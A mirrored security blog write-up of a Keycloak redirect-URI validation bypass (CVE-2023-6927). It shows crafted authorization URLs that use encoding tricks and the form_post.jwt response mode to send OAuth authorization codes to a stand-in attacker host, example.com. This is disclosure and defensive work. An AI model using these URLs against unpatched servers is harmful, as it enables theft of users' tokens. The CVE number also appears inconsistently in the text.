<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://securityblog.omegapoint.se/en/writeup-keycloak-cve-2023-6027/">Original</a>
    <h1>Keycloak open redirect: wildcard redirect URIs can be exploited to steal tokens</h1>
    
    <div id="readability-page-1" class="page"><div>
    <section>
        

        

        <p>This post covers the technical details of CVE-2023-6927 which allows an attacker to create malicious Keycloak
authorization request URLs that bypass the redirect URI validation. This can be exploited to steal a victim’s
authorization code or access token, depending on the client configuration.</p>

<p>The vulnerability affects <em>all</em> OAuth 2.0 clients configured with a redirect URI ending with a <code>*</code> in Keycloak &lt; 23.0.4.</p>



<p>The current best practices for OAuth 2.0 in browser-based apps is to use the <em>authorization code</em> flow with <em>Proof-Key
for Code Exchange</em> (PKCE). 
The otherwise common <em>implicit grant</em> flow has been deprecated and omitted from <a href="https://oauth.net/2.1/">OAuth 2.1</a>.</p>

<p>Both the authorization code flow (<code>reponse_type=code</code>) and implicit grant (<code>response_type=token</code>) rely on browser-based redirection to perform the authentication ceremony.</p>

<p><img src="https://securityblog.omegapoint.se/static/images/oauth2-code-flow.drawio.png" alt="Overview of OAuth 2.0 code flow"/></p>

<p>Step 1 includes the parameter <code>redirect_uri</code> which is used as a callback when the user has authenticated with the identity
provider. The code (or token) is attached to the redirect (step 2) based on the requested <code>response_mode</code>. The two most
common response modes are <code>fragment</code> and <code>query</code> which use <code>HTTP 302</code>-based redirects and places the code in either the
URL query or fragment components of the redirect URI.</p>

<p>Another valid response mode is <code>form_post</code>. When used, the identity provider renders a page containing an
auto-submitting HTML form which performs an HTTP POST request to the redirect URI with the authorization code in the
request body.</p>

<p>The client can then exchange the authorization code (step 3) for an access token, which can be used to access APIs (step
4). Whether step 3 requires the client to also supply its <em>client secret</em> depends on if the client is <em>public</em> or
<em>confidential</em>. Public clients are used when the client is unable to store secrets, for example in single-page
applications.</p>

<blockquote>
  <p>For high-security applications the recommendation is to not use public clients, even for single-page applications and instead utilize the <em>Backend-For-Frontend</em> (BFF) pattern. For
more details, see our talk on common OAuth 2.0 and OIDC pitfalls.</p>

  <p><a href="https://www.youtube.com/watch?v=MpPd0WnEG5s">How to f*ck up at OAuth2 while following BCPs -Tobias Ahnoff, Pontus Hanssen - SecurityFest2023 (youtube.com)</a></p>
</blockquote>

<p>For implementations using implicit grant, an access token is returned in step 2, and step 3 can be omitted.</p>

<p>It is up to the identity provider to verify that the specified <code>redirect_uri</code> matches one of the configured URIs for the given client. The specification mandates that simple string comparison is used (character by character).</p>

<blockquote>
  <p>“When a redirection URI is included in an authorization request, the
 authorization server MUST compare and match the value received
 against at least one of the registered redirection URIs (or URI
 components) as defined in [RFC3986] Section 6, if any redirection
 URIs were registered.  If the client registration included the full
 redirection URI, the authorization server MUST compare the two URIs
 using simple string comparison as defined in [RFC3986] Section 6.2.1”</p>

  <p><a href="https://www.rfc-editor.org/rfc/rfc6749">RFC6749, section 3.1.2.3</a></p>
</blockquote>

<p>It is also clear that a configured redirect URI must be an absolute URI, the word <em>must</em> is used as a definition of an
absolute requirement by the specification.</p>

<blockquote>
  <p>“The redirection endpoint URI MUST be an absolute URI as defined by
  [RFC3986] Section 4.3.”</p>

  <p><a href="https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2">RFC6749, section 3.1.2</a></p>
</blockquote>

<p>If the redirect URI validation is broken, an attacker may craft malicious authorization request URIs which, when accessed
by a victim, sends their access token or authorization code to an attacker-controlled site (instead of the intended
client).</p>



<p>Keycloak is a popular open source identity provider used by many organizations and companies world-wide and is a CNCF
incubation project. They describe the project as:</p>

<blockquote>
  <p>“Keycloak is an Open Source Identity and Access Management solution for modern Applications and Services.”
<a href="https://github.com/keycloak/keycloak">github.com/keycloak/keycloak</a></p>
</blockquote>

<p>When creating OAuth 2.0 clients in Keycloak it is possible to specify redirect URIs containing wildcards using a <code>*</code> character.
Wildcards can only be used at the end of a redirect URI. This can be seen in the Keycloak default client for the admin
panel <code>security-admin-console</code>, were the redirect URI pattern is <code>/admin/master/console/*</code>.  In such cases “simple string comparison” is not used,
instead Keycloak asserts that the configured redirect URI is a prefix (minus the <code>*</code> character) of the redirect URI
specified in the authorization request.</p>



<p>Open redirect vulnerabilities allow an attacker to craft links which, when visited by a victim, redirects them away from the intended site to another site specified by the attacker.</p>

<p>An attacker may use such vulnerabilities to for example redirect to a phishing-site, with the aim of stealing user credentials.
Open redirects are commonly considered low risk vulnerabilities since they require a significant amount of
user interaction and can’t be used to leak sensitive information directly from the vulnerable application. However, this
is not always the case for OAuth 2.0 based implementations.</p>

<p>An insecure OAuth 2.0 client configured to accept any redirect URI enables open redirect by design, with the
added bonus that a victim’s access token or authorization code is sent to the attacker-controlled site with the redirect.</p>

<p><img src="https://securityblog.omegapoint.se/static/images/oauth2-open-redirect.png" alt="open redirect used to steal OAuth 2.0 access token"/></p>

<p>In the example above, the attacker constructs an authorization request URL that can be used by users of the application “App” to
sign in. By modifying the <code>redirect_uri</code> parameter the attacker can trick victims using the URL to send their
authorization code (or access token) to the attacker server, instead of it being sent back to the application.</p>

<p>The attacker can now exchange the code for an access token if the “App” OAuth 2.0 client is a public client, or use the access
token directly if implicit flow was used.</p>

<p>In this instance the attacker could specify arbitrary redirect URIs due to an insecure configuration of the OAuth 2.0 client.</p>



<p>Now that we have established that arbitrary redirect URIs (with only a wildcard <code>*</code>) are insecure, let’s look at a
vulnerability in Keycloak which allows an attacker to bypass the prefix of redirect URIs. In other words, how can we
trick Keycloak into thinking <code>https://my.application.internal/*</code> is equal to <code>*</code>.</p>

<blockquote>
  <p>This vulnerability has been assigned CVE-2023-6927 and a patch has been released as of Keycloak 23.0.4.</p>
</blockquote>

<p>Keycloak comes with a couple of default OAuth 2.0 clients, for example the <code>security-admin-console</code> client used to
access the admin web application of Keycloak. To make things easier to follow, we will use this client for
demonstration. It’s however worth mentioning that any client with a redirect URI that ends in a wildcard running
Keycloak &lt; 23.0.4 is vulnerable.</p>

<p><img src="https://securityblog.omegapoint.se/static/images/keycloak-seurity-admin-console-config.png" alt=""/></p>

<p>The image above shows the default configuration of the <code>security-admin-console</code> client. We note that
there is only one valid redirect (Keycloak supports multiple redirect URIs per client). The redirect URI starts with a
<code>/</code> and ends with a <code>*</code>. Given that this Keycloak instance is running on <code>http://localhost:8080</code>, any redirect URI
parameter starting with <code>http://localhost:8080/admin/master/console/</code> should be accepted.</p>

<p>If we scroll down on the client configuration page we note that it supports “standard flow”, i.e. authorization code
flow. The implicit flow is not enabled. We also note that client authentication is disabled. This will be important
later.</p>

<p><img src="https://securityblog.omegapoint.se/static/images/keycloak-security-admin-console-config-2.png" alt=""/></p>

<p>As mentioned earlier, the first step to the sign in process is the authorization request. Given our Keycloak admin
application running on <code>http://localhost:8080</code>, such a request might have the following URL.</p>

<div><div><pre><code>http://localhost:8080/realms/master/protocol/openid-connect/auth
  ?client_id=security-admin-console
  &amp;redirect_uri=http%3A%2F%2Flocalhost%3A8080%2Fadmin%2Fmaster%2Fconsole%2F
  &amp;state=2e9f6263-0862-40a0-827b-e380f374e5dc
  &amp;response_mode=fragment
  &amp;response_type=code
  &amp;scope=openid
  &amp;nonce=2f9d5237-8df8-4a1e-9917-d9e64d7048a4
  &amp;code_challenge=SVHJKLQphjYjmQoJi5cynyJ4eP3d51swgJLknKkxI-c
  &amp;code_challenge_method=S256
</code></pre></div></div>

<p>The <code>redirect_uri</code> parameter contains the URL encoded representation of <code>http://localhost:8080/admin/master/console/</code>.</p>

<p>One interesting fact about Keycloak is that when validating the <code>redirect_uri</code> parameter it will attempt to URL decode
the value multiple times to find a match. This means that the redirect URI
<code>http%253A%252F%252Flocalhost%253A8080%252Fadmin%252Fmaster%252Fconsole%252F</code> (where <code>%25</code> is a URL encoded percent character) is just as valid,
at least to the redirect validator. However, if we attempt to sign in with that URL, after entering our credentials we
are redirected to <code>http://localhost:8080/http%253a%252f%252flocalhost%253a8080%252fadmin%252fmaster%252fconsole%252f</code>,
which does not exist.</p>

<p><img src="https://securityblog.omegapoint.se/static/images/keycloak-404.png" alt=""/></p>

<p>This means that Keycloak will URL decode all parts of the user-supplied redirect URI to find a match, and then redirect
to the <em>encoded</em> value.</p>

<p>But how do we use this to redirect to any host and bypass the prefix? With HTTP Basic Auth.</p>

<blockquote>
  <p>It’s possible to construct URLs that contain HTTP Basic Auth credentials in the following format:
<code>https://username:password@example.com</code>. If you open this link in a web browser it will automatically add an
<code>Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=</code> to the request towards example.com. <code>dXNlcm5hbWU6cGFzc3dvcmQ=</code> is
<code>username:password</code> encoded using base64.</p>
</blockquote>

<p>There is one caveat though — the username may not include any slash characters, but that is not a problem now that we can
URL encode them.</p>

<p>With that knowledge we can construct a new redirect URI:</p>

<div><div><pre><code>http://localhost%253a8080%252fadmin%252fmaster%252fconsole%252f:@example.com
</code></pre></div></div>

<p>The host part of this URI points to <code>example.com</code> and includes the original redirect URI (URL encoded) as the HTTP Basic
Auth username with a blank password. When processed by Keycloak’s redirect validator, the URI is URL decoded into:</p>

<div><div><pre><code>http://localhost:8080/admin/master/console/:@example.com
</code></pre></div></div>

<p>The decoded URI’s host part is <code>localhost</code> and the path is <code>/admin/master/console:@example.com</code> which matches the
expected redirect URI pattern.</p>

<blockquote>
  <p>This exact issue was reported by another security researcher and assigned
<a href="https://github.com/keycloak/keycloak/security/advisories/GHSA-mpwq-j3xf-7m5w">CVE-2023-6291</a> and our original
vulnerability report was considered a duplicate.
CVE-2023-6291 was patched in Keycloak 23.0.3.</p>
</blockquote>

<p>The patch for CVE-2023-6291 changes the behavior of the redirect validator and it now removes any HTTP Basic Auth
information from the URI before attempting to URL decode and match the supplied redirect URI.</p>



<p>The original authorization request includes <code>response_mode=fragment</code>. This response mode will perform the redirect using
an <code>HTTP 302 Found</code> status code and pass the redirect destination using the <code>Location</code> HTTP header. The authorization
code is appended to the URL fragment, as shown in the following example.</p>

<div><div><pre><code><span>HTTP</span><span>/</span><span>1.1</span> <span>302</span> <span>Found</span>
<span>Referrer-Policy</span><span>:</span> <span>no-referrer</span>
<span>X-Frame-Options</span><span>:</span> <span>SAMEORIGIN</span>
<span>Strict-Transport-Security</span><span>:</span> <span>max-age=31536000; includeSubDomains</span>
<span>X-Robots-Tag</span><span>:</span> <span>none</span>
<span>Cache-Control</span><span>:</span> <span>no-store, must-revalidate, max-age=0</span>
<span>X-Content-Type-Options</span><span>:</span> <span>nosniff</span>
<span>Content-Security-Policy</span><span>:</span> <span>frame-src &#39;self&#39;; frame-ancestors &#39;self&#39;; object-src &#39;none&#39;;</span>
<span>X-XSS-Protection</span><span>:</span> <span>1; mode=block</span>
<span>Location</span><span>:</span> <span>http://localhost:8080/admin/master/console/#state=2e9f6263-0862-40a0-827b-e380f374e5dc&amp;session_state=f12998b0-1d47-4903-b5a5-44b012dc03b8&amp;code=a9cd431b-1c45-4c98-a75c-d7187c326792.f12998b0-1d47-4903-b5a5-44b012dc03b8.2014289e-0975-4ce5-8d25-4946b641f5b3</span>
<span>connection</span><span>:</span> <span>close</span>
<span>content-length</span><span>:</span> <span>0</span>
</code></pre></div></div>

<p>If <code>response_mode=form_post</code> is used instead of <code>response_mode=fragment</code>, the redirect will be performed using an HTML Form,
like in the following example.</p>

<div><div><pre><code> <span>&lt;body</span> <span>onload=</span><span>&#34;document.forms[0].submit()&#34;</span><span>&gt;</span>
    <span>&lt;form</span> <span>method=</span><span>&#34;post&#34;</span> <span>action=</span><span>&#34;http://localhost:8080/admin/master/console/&#34;</span><span>&gt;</span>
        <span>&lt;input</span> <span>type=</span><span>&#34;hidden&#34;</span> <span>name=</span><span>&#34;code&#34;</span> <span>value=</span><span>&#34;14260171-65df-45e2-87ad-a671519ccdb4.0b72dbb5-bff2-444c-870d-3cf0cb7fcb3b.2014289e-0975-4ce5-8d25-4946b641f5b3&#34;</span> <span>/&gt;</span>
        <span>&lt;input</span> <span>type=</span><span>&#34;hidden&#34;</span> <span>name=</span><span>&#34;state&#34;</span> <span>value=</span><span>&#34;2e9f6263-0862-40a0-827b-e380f374e5dc&#34;</span> <span>/&gt;</span>
        <span>&lt;input</span> <span>type=</span><span>&#34;hidden&#34;</span> <span>name=</span><span>&#34;session_state&#34;</span> <span>value=</span><span>&#34;0b72dbb5-bff2-444c-870d-3cf0cb7fcb3b&#34;</span> <span>/&gt;</span>
        <span>&lt;noscript&gt;</span>
            <span>&lt;p&gt;</span>JavaScript is disabled. We strongly recommend to enable it. Click the button below to continue .<span>&lt;/p&gt;</span>
            <span>&lt;input</span> <span>name=</span><span>&#34;continue&#34;</span> <span>type=</span><span>&#34;submit&#34;</span> <span>value=</span><span>&#34;continue&#34;</span> <span>/&gt;</span>
        <span>&lt;/noscript&gt;</span>
    <span>&lt;/form&gt;</span>
<span>&lt;/body&gt;</span>
</code></pre></div></div>

<p>In this case the redirect URI is written to an HTML attribute, which allows us to encode characters as HTML entities
(<code>a = &amp;#x61;</code>, <code>b = &amp;#x62;</code>, etc.). We can use this to HTML entity encode the @-sign in the redirect URI so that the
it’s not removed by the redirect validator. Our new redirect URI is:</p>

<div><div><pre><code>http://locahost%253a8080%252fadmin%252fmaster%252fconsole%252f:%26%23x40%3bexample.com
</code></pre></div></div>

<p>This URL does not (on the surface of it) include any HTTP Basic Auth parameters, since there’s no <code>@</code> character. When
URL decoded it becomes:</p>

<div><div><pre><code>http://localhost:8080/admin/master/console/:&amp;#x40;example.com
</code></pre></div></div>

<p>Which matches the expected redirect URI pattern. The redirect HTML form is rendered as:</p>

<div><div><pre><code> <span>&lt;body</span> <span>onload=</span><span>&#34;document.forms[0].submit()&#34;</span><span>&gt;</span>
    <span>&lt;form</span> <span>method=</span><span>&#34;post&#34;</span> <span>action=</span><span>&#34;http://localhost:8080%2Fadmin%2Fmaster%2Fconsole%2F:&amp;#x40;example.com&#34;</span><span>&gt;</span>
        <span>&lt;input</span> <span>type=</span><span>&#34;hidden&#34;</span> <span>name=</span><span>&#34;code&#34;</span> <span>value=</span><span>&#34;14260171-65df-45e2-87ad-a671519ccdb4.0b72dbb5-bff2-444c-870d-3cf0cb7fcb3b.2014289e-0975-4ce5-8d25-4946b641f5b3&#34;</span> <span>/&gt;</span>
        <span>&lt;input</span> <span>type=</span><span>&#34;hidden&#34;</span> <span>name=</span><span>&#34;state&#34;</span> <span>value=</span><span>&#34;2e9f6263-0862-40a0-827b-e380f374e5dc&#34;</span> <span>/&gt;</span>
        <span>&lt;input</span> <span>type=</span><span>&#34;hidden&#34;</span> <span>name=</span><span>&#34;session_state&#34;</span> <span>value=</span><span>&#34;0b72dbb5-bff2-444c-870d-3cf0cb7fcb3b&#34;</span> <span>/&gt;</span>
        <span>&lt;noscript&gt;</span>
            <span>&lt;p&gt;</span>JavaScript is disabled. We strongly recommend to enable it. Click the button below to continue .<span>&lt;/p&gt;</span>
            <span>&lt;input</span> <span>name=</span><span>&#34;continue&#34;</span> <span>type=</span><span>&#34;submit&#34;</span> <span>value=</span><span>&#34;continue&#34;</span> <span>/&gt;</span>
        <span>&lt;/noscript&gt;</span>
    <span>&lt;/form&gt;</span>
<span>&lt;/body&gt;</span>
</code></pre></div></div>

<p>When the form is submitted, <code>&amp;#x40;</code> is treated as a <code>@</code>, which allows the form to be posted to <code>http://example.com</code>, with the original redirect URI as HTTP Basic Auth credentials.</p>

<blockquote>
  <p>However, another security researcher had reported a second vulnerability (assigned
<a href="https://github.com/keycloak/keycloak/security/advisories/GHSA-cvg2-7c3j-g36j">CVE-2023-6134</a>), which uses this same
approach to achieve cross-site scripting (XSS) in clients using wildcard redirect URIs.
A fix for CVE-2023-6134 was introduced in Keycloak 23.0.3.</p>
</blockquote>

<p>The patch for CVE-2023-6134 escapes HTML entities by replacing <code>&amp;</code> with <code>&amp;amp;</code> in the <code>action</code> attribute of the form
returned using <code>response_mode=form_post</code>.</p>



<p>With the <code>response_mode=form_post</code> patched using proper output encoding we need to find another way of triggering the
redirect. Since Keycloak is open source we can look at all the supported response modes.</p>

<div><div><pre><code><span>public</span> <span>enum</span> <span>OIDCResponseMode</span> <span>{</span>

    <span>QUERY</span><span>(</span><span>&#34;query&#34;</span><span>),</span>
    <span>JWT</span><span>(</span><span>&#34;jwt&#34;</span><span>),</span>
    <span>FRAGMENT</span><span>(</span><span>&#34;fragment&#34;</span><span>),</span>
    <span>FORM_POST</span><span>(</span><span>&#34;form_post&#34;</span><span>),</span>
    <span>QUERY_JWT</span><span>(</span><span>&#34;query.jwt&#34;</span><span>),</span>
    <span>FRAGMENT_JWT</span><span>(</span><span>&#34;fragment.jwt&#34;</span><span>),</span>
    <span>FORM_POST_JWT</span><span>(</span><span>&#34;form_post.jwt&#34;</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>The JWT response modes are part of the <em>JWT Secured Authorization Response Mode for OAuth 2.0</em> (JARM) standard, which
essentially returns the authorization code or token inside a signed JWT.</p>

<p>It turns out that the patch for CVE-2023-6134 only enabled proper output encoding for the HTML form used in
<code>response_mode=form_post</code>, which allows us to use the following authorization URL to bypass the redirect URI
restrictions in Keycloak 23.0.3.</p>

<div><div><pre><code>http://localhost:8080/realms/master/protocol/openid-connect/auth
  ?client_id=security-admin-console
  &amp;redirect_uri=http%3A%2F%2Flocalhost%3A8080%252Fadmin%252Fmaster%252Fconsole%252F:%26%23x40%3bexample.com
  &amp;response_mode=form_post.jwt
  &amp;response_type=code
  &amp;scope=openid
  &amp;code_challenge=ZtNPunH49FD35FWYhT5Tv8I7vRKQJ8uxMaL0_9eHjNA
  &amp;code_challenge_method=S256
</code></pre></div></div>

<p>This vulnerability was reported to Keycloak on 2023-12-18. It was accepted and assigned CVE-2023-6927.</p>



<p>The vulnerability can be reproduced in the latest versions of both Mozilla Firefox and Google Chrome, but with slightly
different results. As a security mechanism Firefox attempts to warn the user when the form to destination URL containing
basic auth credentials.</p>

<p><img src="https://securityblog.omegapoint.se/static/images/firefox-basic-auth-warning.png" alt=""/></p>

<p>Clicking “Yes”, allows the attack to succeed. Chrome on the other hand does not prompt or warn the user in any way and
the redirect to the attacker-controlled domain is seamless.</p>

<p>Below are two recordings that demonstrate the vulnerability, one for Firefox and one for Chrome. Since the OAuth 2.0
client <code>security-admin-console</code> does not require client authentication it is possible to exchange the stolen
authorization code for an access token.</p>

<h2 id="chrome-demo">Chrome Demo</h2>

<video src="/static/images/chrome-token-theft-2.mp4" controls=""></video>

<h2 id="firefox-demo">Firefox Demo</h2>

<p>In the Firefox demo there’s an additional warning since the form post is performed over HTTP (and not HTTPS), which is
necessary since the Keycloak instance used for the demo does not support HTTPS. All production instances of Keycloak
(should) support HTTPS, which would remove this extra prompt.</p>

<video src="/static/images/firefox-token-theft-2.mp4" controls=""></video>



<p>OAuth 2.0 is quite complex and supports many different flows and redirect patterns.  Using wildcards as part of OAuth
2.0 redirect URIs can introduce severe vulnerabilities for an application. When implementing OAuth 2.0 based
authentication, we strongly recommend using strict string matching of redirect URIs and to not use wildcards.</p>

<p>Even though the vulnerability described in this post is patched, there are other opportunities for misconfiguration of
redirect URIs. For example, consider the redirect URI pattern <code>https://example.com*</code> (without a trailing slash). In this
case, all an attacker needs to do is register a domain and create the subdomain <code>example.com.attacker-domain.com</code> to
bypass the restrictions.</p>

<p>For more reading material on OAuth 2.0 and Identity Providers, see 
<a href="https://securityblog.omegapoint.se/en/defence-in-depth/3-clients-and-sessions">Defence in Depth: Clients and sessions (part 3/7)</a> and 
<a href="https://securityblog.omegapoint.se/en/how-to-choose-an-idp/">How to choose an Identity Provider (IdP)</a>.</p>

<h2 id="timeline">Timeline</h2>

<p>Representatives from Keycloak have been quick to investigate and address the reported issues. Thank you!</p>

<ul>
  <li><strong>2023-11-30</strong> Initial vulnerability submission to Keycloak</li>
  <li><strong>2023-12-05</strong> Keycloak acknowledged that the submission was received</li>
  <li><strong>2023-12-05</strong> Submission considered duplicate due to CVE-2023-6134 and CVE-2023-6291</li>
  <li><strong>2023-12-15</strong> Keycloak 23.0.3 released, containing patches for the two CVEs</li>
  <li><strong>2023-12-18</strong> New vulnerability report submitted regarding <code>response_mode=form_post.jwt</code></li>
  <li><strong>2023-12-18</strong> Report accepted by Keycloak and assigned CVE-2023-6027</li>
  <li><strong>2024-01-08</strong> Keycloak 23.0.4 released containing a patch for the vulnerability</li>
  <li><strong>2024-01-11</strong> Coordinated disclosure by publishing this blog post</li>
</ul>

<hr/>



        
    
    
    <hr/>
    <h2>More in this series:</h2>
    <ul>
    
        
        <li><a href="https://securityblog.omegapoint.se/en/writeup-apigw/">
        Writeup: AWS API Gateway header smuggling and cache confusion
        </a></li>
        
    
        
        <li><b>Writeup: Keycloak open redirect (CVE-2023-6927)</b></li>
        
    
    

    </ul></section>
</div></div>
  </body>
</html>
